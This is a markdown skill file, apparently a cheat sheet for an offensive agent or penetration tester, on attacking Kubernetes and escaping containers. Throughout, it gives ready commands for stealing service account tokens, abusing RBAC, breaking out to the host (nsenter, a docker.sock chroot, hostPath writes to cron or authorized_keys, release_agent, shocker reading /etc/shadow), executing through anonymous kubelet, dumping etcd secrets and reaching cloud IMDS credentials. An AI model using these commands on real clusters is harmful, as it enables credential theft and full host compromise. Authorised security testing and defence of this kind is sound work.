---
name: k8s
description: Kubernetes and container escape — tokens, RBAC, kubelet, etcd, runtime.
tags: [k8s, docker, container, escape]
---
# Kubernetes / containers

## Inside a pod
- Token: `/var/run/secrets/kubernetes.io/serviceaccount/token`, `ca.crt`, `namespace`.
- `KUBECONFIG` env, `~/.kube/config`, mounted secrets in `/etc/*`.
- API: `curl -k -H "Authorization: Bearer $T" https://kubernetes.default.svc/api`.
- `kubectl auth can-i --list` (with token) → secrets, pods/exec, create pods.

## RBAC paths
- `get secrets` → read all service account tokens.
- `create pods` → mount hostPath `/` and chroot.
- `pods/exec` → exec into a privileged pod.
- `escalate`/`bind` on roles, `impersonate` on users/groups.
- Tools: `kube-hunter`, `kubectl-who-can`, `rbac-police`.

## Escape
- Privileged container: `mount /dev/sda1 /mnt` or `nsenter -t 1 -m -u -i -n -p sh`.
- `hostPath` mount: write `/etc/cron.d`, `/root/.ssh/authorized_keys`.
- `docker.sock` mounted: `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- `CAP_SYS_ADMIN`: cgroup `release_agent`.
- `CAP_DAC_READ_SEARCH`: `shocker` reads `/etc/shadow` from the host.
- Kernel: `unshare -Ur` + overlayfs CVE-2023-0386; `runc` CVE-2019-5736.

## Kubelet / etcd
- Kubelet 10250 anonymous: `/pods`, `/exec/{ns}/{pod}/{container}?command=id`.
- 10255 read-only: `/pods`, `/spec`.
- etcd 2379: `etcdctl --endpoints=127.0.0.1:2379 get / --prefix --keys-only` → secrets.

## Hidden knowledge
- Service account tokens are JWTs: decode for namespace, SA name, expiry.
- `automountServiceAccountToken: false` still leaves projected tokens in some setups.
- Check `/proc/1/cgroup` and `/.dockerenv` to confirm containerization.
- `cat /proc/self/status | grep Cap` → decode with `capsh --decode=`.
- Cloud-managed K8s (EKS/GKE/AKS) pods may reach IMDS and inherit the node IAM role.
